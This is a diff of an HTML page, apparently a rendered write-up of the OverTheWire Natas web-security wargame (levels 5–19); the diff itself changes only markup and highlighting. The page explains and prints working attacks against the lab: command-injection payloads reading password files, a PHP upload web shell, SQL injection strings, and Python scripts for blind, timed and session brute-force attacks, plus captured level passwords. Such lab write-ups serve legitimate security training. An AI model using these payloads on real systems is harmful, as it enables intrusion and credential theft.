@@ -78,15 +78,15 @@ password.</p>
 <p><code>Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</code></p>
 <h2 id="5">5</h2>
 <p>The webapp notes that:</p>
-<pre><code>authorized users should come only from
+<pre tabindex="0"><code>authorized users should come only from
 &quot;http://natas5.natas.labs.overthewire.org/&quot;
 </code></pre><p>We can trick the server into thinking we&rsquo;ve come from that URL by adding the
 Referer header to our HTTP request:</p>
-<pre><code>Referer: http://natas5.natas.labs.overthewire.org/
+<pre tabindex="0"><code>Referer: http://natas5.natas.labs.overthewire.org/
 </code></pre><p><code>iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</code></p>
 <h2 id="6">6</h2>
 <p>Inspecting the site, we see that the following cookie has been set:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">loggedin = 0;
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">loggedin = 0;
 </code></pre></div><p>Change this cookie to 1, and the password is returned.</p>
 <p><code>aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</code></p>
 <h2 id="7">7</h2>
@@ -105,7 +105,7 @@ password.</p>
 <p>Looking at the source code, we see that the secret, when encoded must match:
 <code>3d3d516343746d4d6d6c315669563362</code>. To find out the clear text secret, we can
 reverse the encoding steps:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?php
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?php
 &gt; hex2bin(<span style="color:#a31515">&#34;3d3d516343746d4d6d6c315669563362&#34;</span>);
 <span style="color:#a31515">&#34;==QcCtmMml1ViV3b&#34;</span>
 &gt; strrev(<span style="color:#a31515">&#34;==QcCtmMml1ViV3b&#34;</span>);
@@ -117,34 +117,34 @@ reverse the encoding steps:</p>
 <h2 id="10">10</h2>
 <p>In this level, user input is passed to the PHP
 <a href="https://secure.php.net/manual/en/function.passthru.php">passthru</a> function:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">passthru(<span style="color:#a31515">&#34;grep -i </span><span style="color:#a31515">$key</span><span style="color:#a31515"> dictionary.txt&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">passthru(<span style="color:#a31515">&#34;grep -i </span><span style="color:#a31515">$key</span><span style="color:#a31515"> dictionary.txt&#34;</span>);
 </code></pre></div><p>We can terminate the <code>grep</code> with a semicolon, run an arbitrary command, and
 comment any code that comes after with:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">; cat /etc/natas_webpass/natas10 <span style="color:#008000">#</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">; cat /etc/natas_webpass/natas10 <span style="color:#008000">#</span>
 </code></pre></div><p>Here, we return the contents of the password file with <code>cat</code>:</p>
 <p><code>s09byvi8880wqhbnonMFMW8byCojm8eA</code></p>
 <h2 id="11">11</h2>
 <p>This level is the same as level <a href="#10">10</a>, but the characters <code>;</code>, <code>|</code> and <code>&amp;</code>
 are blocked by the server. We can utilise the <code>grep</code> to search for everything in
 the password file:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">.* /etc/natas_webpass/natas11 <span style="color:#008000">#</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">.* /etc/natas_webpass/natas11 <span style="color:#008000">#</span>
 </code></pre></div><p><code>SUIRtXqbB3tWzTOgTAX2t8UfMbYKrgp6</code></p>
 <h2 id="12">12</h2>
 <p>In this level, we need to set a cookie, such that when it is base64 decoded and
 XOR decrypted with an unkown key, it returns the JSON string:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{ &#34;showpassword&#34;: <span style="color:#a31515">&#34;yes&#34;</span>, &#34;bgcolor&#34;: <span style="color:#a31515">&#34;#ffffff&#34;</span> }
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{ &#34;showpassword&#34;: <span style="color:#a31515">&#34;yes&#34;</span>, &#34;bgcolor&#34;: <span style="color:#a31515">&#34;#ffffff&#34;</span> }
 </code></pre></div><p>To do this, we need to work out the XOR encryption key. Luckily, XOR encryption
 has the following property:</p>
-<pre><code>secret XOR key = encrypted_secret
+<pre tabindex="0"><code>secret XOR key = encrypted_secret
 encrypted_secret XOR secret = key
 </code></pre><p>This property means that if we know a secret and the value it gets encrypted to,
 we can work out the key.</p>
 <p>Looking through the server source code, we see that the default secret is:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{ &#34;showpassword&#34;: <span style="color:#a31515">&#34;no&#34;</span>, &#34;bgcolor&#34;: <span style="color:#a31515">&#34;#ffffff&#34;</span> }
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{ &#34;showpassword&#34;: <span style="color:#a31515">&#34;no&#34;</span>, &#34;bgcolor&#34;: <span style="color:#a31515">&#34;#ffffff&#34;</span> }
 </code></pre></div><p>And by looking at the cookie returned, we can see that the encrypted secret is:</p>
-<pre><code>ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
+<pre tabindex="0"><code>ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
 </code></pre><p>We can perform the XOR with the following code:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?php
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?php
 $origData = base64_decode(
     <span style="color:#a31515">&#34;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#34;</span>);
 $key = <span style="color:#a31515">&#39;{&#34;showpassword&#34;:&#34;no&#34;,&#34;bgcolor&#34;:&#34;#ffffff&#34;}&#39;</span>;
@@ -154,10 +154,10 @@ $outText = <span style="color:#a31515">&#34;&#34;</span>;
 }
 <span style="color:#00f">echo</span> $outText;
 </code></pre></div><p>Running this gives the output:</p>
-<pre><code>qw8Jqw8J
+<pre tabindex="0"><code>qw8Jqw8J
 </code></pre><p>We see that this is the string <code>qw8J</code> repeated. We then use this key to encrypt
 our original JOSN string:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?php
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?php
 <span style="color:#008000">// xor_encrypt is taken from the server source code
 </span><span style="color:#008000"></span><span style="color:#00f">function</span> xor_encrypt($in) {
     $key = <span style="color:#a31515">&#39;qw8J&#39;</span>;
@@ -174,7 +174,7 @@ our original JOSN string:</p>
 <span style="color:#00f">echo</span> base64_encode(xor_encrypt(<span style="color:#a31515">&#39;{&#34;showpassword&#34;:&#34;yes&#34;,&#34;bgcolor&#34;:&#34;#ffffff&#34;}&#39;</span>));
 </code></pre></div><p>This gives our desired cookie, <code>EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</code>. We set this
 by running the following JavaScript in the browser console:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">document.cookie =
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">document.cookie =
   <span style="color:#a31515">&#34;data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&#34;</span>;
 </code></pre></div><p>Clicking on the <code>set color</code> button returns the password:</p>
 <p><code>EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</code></p>
@@ -182,7 +182,7 @@ by running the following JavaScript in the browser console:</p>
 <p>In this level, a file is uploaded to the server, via an HTML form. Looking at
 the source code, we see that the form has a few elements, which are initially
 hidden:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;input type=<span style="color:#a31515">&#34;hidden&#34;</span> name=<span style="color:#a31515">&#34;MAX_FILE_SIZE&#34;</span> value=<span style="color:#a31515">&#34;1000&#34;</span> /&gt;
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;input type=<span style="color:#a31515">&#34;hidden&#34;</span> name=<span style="color:#a31515">&#34;MAX_FILE_SIZE&#34;</span> value=<span style="color:#a31515">&#34;1000&#34;</span> /&gt;
 &lt;input type=<span style="color:#a31515">&#34;hidden&#34;</span> name=<span style="color:#a31515">&#34;filename&#34;</span> value=<span style="color:#a31515">&#34;&lt;? print genRandomString(); ?&gt;.jpg&#34;</span> /&gt;
 </code></pre></div><p>When writing the file to disk, the server code generates a random name for the
 file. However, the extension given to the file is pulled from the hidden
@@ -193,7 +193,7 @@ form, that extension will be used to store our file on disk.</p>
 a <code>.php</code> extension will cause it to execute it as a PHP file.</p>
 <p>We can therefore get the password by changing the text of the <code>filename</code> input
 to <code>file.php</code> uploading the file:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?php
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?php
 passthru(<span style="color:#a31515">&#39;cat /etc/natas_webpass/natas13&#39;</span>);
 </code></pre></div><p>Submitting the form displays a link to the file. When we click on the link, the
 PHP code is executed and the password is displayed.</p>
@@ -210,7 +210,7 @@ to be. We can therefore trick the function by supplying a file which starts with
 the first few bytes of an image format. For example, <code>jpeg</code> files start with the
 number <code>0xFFD8FFE0</code>. We can create a <code>php</code> script with the correct starting
 bytes with the following <code>python</code> code:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00f">with</span> open(<span style="color:#a31515">&#34;script.php&#34;</span>, <span style="color:#a31515">&#34;w&#34;</span>) <span style="color:#00f">as</span> f:
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00f">with</span> open(<span style="color:#a31515">&#34;script.php&#34;</span>, <span style="color:#a31515">&#34;w&#34;</span>) <span style="color:#00f">as</span> f:
     f.write(<span style="color:#a31515">&#39;</span><span style="color:#a31515">\xFF\xD8\xFF\xE0</span><span style="color:#a31515">&#39;</span>)
     f.write(<span style="color:#a31515">&#34;&#34;&#34;&lt;?php
 </span><span style="color:#a31515">passthru(&#39;cat /etc/natas_webpass/natas14&#39;);
@@ -223,7 +223,7 @@ before prints out the password.</p>
 <h2 id="15">15</h2>
 <p>Level 15 features a SQL injection attack. The following query is executed
 against a MySQL database:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?php
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?php
 $query = <span style="color:#a31515">&#34;SELECT * from users where username=</span><span style="color:#a31515">\&#34;</span><span style="color:#a31515">&#34;</span>
     .$_REQUEST[<span style="color:#a31515">&#34;username&#34;</span>]
     .<span style="color:#a31515">&#34;</span><span style="color:#a31515">\&#34;</span><span style="color:#a31515"> and password=</span><span style="color:#a31515">\&#34;</span><span style="color:#a31515">&#34;</span>
@@ -234,10 +234,10 @@ printed. Supplying the <code>debug</code> keyword in the query string prints out
 which is to be executed, making it easier to debug.</p>
 <p>Looking at the query, need to construct a statement which reutrns a row.</p>
 <p>The statement:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#00f">SELECT</span> * <span style="color:#00f">from</span> users <span style="color:#00f">where</span> username=<span style="color:#a31515">&#34;&#34;</span> <span style="color:#00f">or</span> <span style="color:#a31515">&#34;1&#34;</span>=<span style="color:#a31515">&#34;1&#34;</span> <span style="color:#00f">and</span> password=<span style="color:#a31515">&#34;&#34;</span> <span style="color:#00f">or</span> <span style="color:#a31515">&#34;1&#34;</span>=<span style="color:#a31515">&#34;1&#34;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#00f">SELECT</span> * <span style="color:#00f">from</span> users <span style="color:#00f">where</span> username=<span style="color:#a31515">&#34;&#34;</span> <span style="color:#00f">or</span> <span style="color:#a31515">&#34;1&#34;</span>=<span style="color:#a31515">&#34;1&#34;</span> <span style="color:#00f">and</span> password=<span style="color:#a31515">&#34;&#34;</span> <span style="color:#00f">or</span> <span style="color:#a31515">&#34;1&#34;</span>=<span style="color:#a31515">&#34;1&#34;</span>
 </code></pre></div><p>Makes use of SQL tautologies to return rows.</p>
 <p>We can run this command by calling the URL with the following query string:</p>
-<pre><code>?username=%22%20or%20%221%22=%221&amp;password=%22%20or%20%221%22=%221&amp;debug
+<pre tabindex="0"><code>?username=%22%20or%20%221%22=%221&amp;password=%22%20or%20%221%22=%221&amp;debug
 </code></pre><p>Running this prints out the password.</p>
 <p><code>AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</code></p>
 <h2 id="16">16</h2>
@@ -248,7 +248,7 @@ password.</p>
 <p>We can construct a SQL query which leaks information about the user&rsquo;s password.
 The following query makes use of the MySQL <code>LIKE</code> function, which pattern
 matches a field.</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#00f">SELECT</span> * <span style="color:#00f">from</span> users <span style="color:#00f">where</span> username=<span style="color:#a31515">&#34;natas16&#34;</span> <span style="color:#00f">AND</span> password <span style="color:#00f">LIKE</span> BINARY <span style="color:#a31515">&#34;a%&#34;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#00f">SELECT</span> * <span style="color:#00f">from</span> users <span style="color:#00f">where</span> username=<span style="color:#a31515">&#34;natas16&#34;</span> <span style="color:#00f">AND</span> password <span style="color:#00f">LIKE</span> BINARY <span style="color:#a31515">&#34;a%&#34;</span>
 </code></pre></div><p>The query tests whether there is a user named <code>natas16</code>, with a password that
 starts with the letter <code>a</code>. If there is, the webpage says &ldquo;This user exists&rdquo;. If
 there isn&rsquo;t the webpage says &ldquo;This user doesn&rsquo;t exist&rdquo;. The web app leaks some
@@ -256,7 +256,7 @@ information about the password. We can then repeat this query checking for the
 letters <code>b, c, ...</code>, until we find a match. We can then repeat the process for
 the second characted, and repeat that until we have the full password.</p>
 <p>The following code does this:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
 
 <span style="color:#00f">import</span> logging
 <span style="color:#00f">import</span> string
@@ -304,7 +304,7 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
 
     password = <span style="color:#a31515">&#34;&#34;</span>
     index = 0
-    <span style="color:#00f">while</span> True:
+    <span style="color:#00f">while</span> <span style="color:#00f">True</span>:
         <span style="color:#00f">try</span>:
             index, char = get_next_char(index, possible_chars)
         <span style="color:#00f">except</span> IndexError:
@@ -314,7 +314,7 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
         password_guess = <span style="color:#a31515">&#34;&#34;</span>.join([password, char, <span style="color:#a31515">&#34;%&#34;</span>])
         text = get_page_text({
             <span style="color:#a31515">&#34;username&#34;</span>:
-                <span style="color:#a31515">&#39;natas16&#34; AND password LIKE BINARY &#34;{0}&#39;</span>.format(password_guess),
+                <span style="color:#a31515">&#39;natas16&#34; AND password LIKE BINARY &#34;</span><span style="color:#a31515">{0}</span><span style="color:#a31515">&#39;</span>.format(password_guess),
             <span style="color:#a31515">&#34;debug&#34;</span>: <span style="color:#a31515">&#34;true&#34;</span>
         })
         <span style="color:#00f">if</span> does_user_exist(text):
@@ -324,7 +324,7 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
 
 
 <span style="color:#00f">def</span> main():
-    <span style="color:#00f">print</span> get_password()
+    print get_password()
 
 
 <span style="color:#00f">if</span> __name__ == <span style="color:#a31515">&#34;__main__&#34;</span>:
@@ -336,7 +336,7 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
 from levels <a href="#10">10</a> and <a href="#11">11</a>, but it returns an error if any of the
 characters <code>;</code>, <code>|</code>, <code>&amp;</code>, <code>`</code>, <code>\</code>, <code>'</code>, and <code>&quot;</code>. are used. We can, however,
 make use of shell varible expansions:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">grep -i <span style="color:#a31515">&#34;</span><span style="color:#00f">$(</span>grep -E ^a.* /etc/natas_webpass/natas17<span style="color:#00f">)</span><span style="color:#a31515">aprils&#34;</span> dictionary.txt
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">grep -i <span style="color:#a31515">&#34;</span><span style="color:#00f">$(</span>grep -E ^a.* /etc/natas_webpass/natas17<span style="color:#00f">)</span><span style="color:#a31515">aprils&#34;</span> dictionary.txt
 </code></pre></div><p>If the password doesn&rsquo;t start with the letter &lsquo;a&rsquo;, the grep inside the variable
 expansion returns nothing, and the outer grep searches for &lsquo;aprils&rsquo;, which it
 finds in dictionary.txt. If however, the password does start with &lsquo;a&rsquo;, the grep
@@ -345,7 +345,7 @@ will return the password, and the outer grep will search for <code>axxxaprils</c
 find, so will return nothing. We can repeat this process for all letters as
 before.</p>
 <p>The code to do this is very similar to the code from level <a href="#16">16</a>:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
 
 <span style="color:#00f">import</span> logging
 <span style="color:#00f">import</span> string
@@ -393,7 +393,7 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
 
     password = <span style="color:#a31515">&#34;&#34;</span>
     index = 0
-    <span style="color:#00f">while</span> True:
+    <span style="color:#00f">while</span> <span style="color:#00f">True</span>:
         <span style="color:#00f">try</span>:
             index, char = get_next_char(index, possible_chars)
         <span style="color:#00f">except</span> IndexError:
@@ -402,7 +402,7 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
             <span style="color:#00f">return</span> password
         password_guess = <span style="color:#a31515">&#34;&#34;</span>.join([password, char])
         text = get_page_text({
-            <span style="color:#a31515">&#34;needle&#34;</span>: <span style="color:#a31515">&#34;$(grep -E ^{0}.* /etc/natas_webpass/natas17)aprils&#34;</span>.format(
+            <span style="color:#a31515">&#34;needle&#34;</span>: <span style="color:#a31515">&#34;$(grep -E ^</span><span style="color:#a31515">{0}</span><span style="color:#a31515">.* /etc/natas_webpass/natas17)aprils&#34;</span>.format(
                 password_guess),
             <span style="color:#a31515">&#34;debug&#34;</span>: <span style="color:#a31515">&#34;true&#34;</span>
         })
@@ -413,7 +413,7 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
 
 
 <span style="color:#00f">def</span> main():
-    <span style="color:#00f">print</span> get_password()
+    print get_password()
 
 
 <span style="color:#00f">if</span> __name__ == <span style="color:#a31515">&#34;__main__&#34;</span>:
@@ -423,12 +423,12 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
 <h2 id="18">18</h2>
 <p>This level is similar to <a href="#16">16</a>, except this time no data is printed out if a
 query returns data or not. We can solve this with a timed blind SQL injection.</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#00f">SELECT</span> * <span style="color:#00f">from</span> USERS <span style="color:#00f">where</span> username=<span style="color:#a31515">&#34;natas18&#34;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#00f">SELECT</span> * <span style="color:#00f">from</span> USERS <span style="color:#00f">where</span> username=<span style="color:#a31515">&#34;natas18&#34;</span>
 <span style="color:#00f">AND</span> <span style="color:#00f">IF</span>(password <span style="color:#00f">LIKE</span> BINARY <span style="color:#a31515">&#34;a%&#34;</span>, SLEEP(2), 0)
 </code></pre></div><p>This query checks if user <code>natas18</code>&rsquo;s password starts with the letter &lsquo;a&rsquo;. If it
 does, then sleep for two seconds, else do nothing. By timing the requests, we
 can tell if we have a match.</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
 
 <span style="color:#00f">import</span> logging
 <span style="color:#00f">import</span> string
@@ -446,7 +446,7 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
 
 
 <span style="color:#00f">def</span> time_get_page(query_dict):
-    logger.debug(<span style="color:#a31515">&#34;running: {0}&#34;</span>.format(query_dict[<span style="color:#a31515">&#34;username&#34;</span>]))
+    logger.debug(<span style="color:#a31515">&#34;running: </span><span style="color:#a31515">{0}</span><span style="color:#a31515">&#34;</span>.format(query_dict[<span style="color:#a31515">&#34;username&#34;</span>]))
     query_dict[<span style="color:#a31515">&#34;debug&#34;</span>] = <span style="color:#a31515">&#34;1&#34;</span>
     start = time.time()
     r = requests.get(
@@ -469,11 +469,11 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
 
     password = <span style="color:#a31515">&#34;&#34;</span>
     index = 0
-    <span style="color:#00f">while</span> True:
+    <span style="color:#00f">while</span> <span style="color:#00f">True</span>:
         <span style="color:#00f">if</span> len(password) == 32:
             <span style="color:#00f">return</span> password
         sql_query = \
-            <span style="color:#a31515">&#39;natas18&#34; AND IF(password LIKE BINARY &#34;{0}&#34;, SLEEP(2), 0) #&#39;</span>
+            <span style="color:#a31515">&#39;natas18&#34; AND IF(password LIKE BINARY &#34;</span><span style="color:#a31515">{0}</span><span style="color:#a31515">&#34;, SLEEP(2), 0) #&#39;</span>
         password_times = {
             time_get_page({
                 <span style="color:#a31515">&#34;username&#34;</span>: sql_query.format(<span style="color:#a31515">&#34;&#34;</span>.join([password, char, <span style="color:#a31515">&#34;%&#34;</span>])),
@@ -487,7 +487,7 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
 
 
 <span style="color:#00f">def</span> main():
-    <span style="color:#00f">print</span> get_password()
+    print get_password()
 
 
 <span style="color:#00f">if</span> __name__ == <span style="color:#a31515">&#34;__main__&#34;</span>:
@@ -502,7 +502,7 @@ logged in by setting the <code>PHPSESSID</code> cookie to the session id of an a
 account. We don&rsquo;t know the admin session number, but we can brute force it by
 trying out session numbers. A comment in the code says that there are only a 640
 possible sessions.</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
 
 <span style="color:#00f">import</span> logging
 <span style="color:#00f">import</span> sys
@@ -525,7 +525,7 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
         cookies={<span style="color:#a31515">&#34;PHPSESSID&#34;</span>: str(session_num)})
     <span style="color:#00f">if</span> <span style="color:#a31515">&#34;You are an admin.&#34;</span> <span style="color:#00f">in</span> r.text:
         logger.info(<span style="color:#a31515">&#34;Admin session: </span><span style="color:#a31515">%d</span><span style="color:#a31515">&#34;</span>, session_num)
-        <span style="color:#00f">print</span> r.text
+        print r.text
 
 
 <span style="color:#00f">def</span> main():
@@ -543,7 +543,7 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
 in a few times, we notice that the cookie is a hex-encoded string
 <code>&lt;session number&gt;-&lt;username&gt;</code>. Using this information, we can brute force the
 problem as before.</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
 
 <span style="color:#00f">import</span> logging
 <span style="color:#00f">import</span> sys
@@ -574,7 +574,7 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
         cookies={<span style="color:#a31515">&#34;PHPSESSID&#34;</span>: str(encoded_session_num)})
     <span style="color:#00f">if</span> <span style="color:#a31515">&#34;You are an admin.&#34;</span> <span style="color:#00f">in</span> r.text:
         logger.info(<span style="color:#a31515">&#34;Admin session: </span><span style="color:#a31515">%d</span><span style="color:#a31515">&#34;</span>, session_num)
-        <span style="color:#00f">print</span> r.text
+        print r.text
 
 
 <span style="color:#00f">def</span> main():
@@ -589,7 +589,7 @@ logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel
 <hr>
 <ol>
 <li id="fn:1" role="doc-endnote">
-<p>Hacking into systems without explicit permission is illegal. <a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+<p>Hacking into systems without explicit permission is illegal.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
 </li>
 </ol>
 </section>
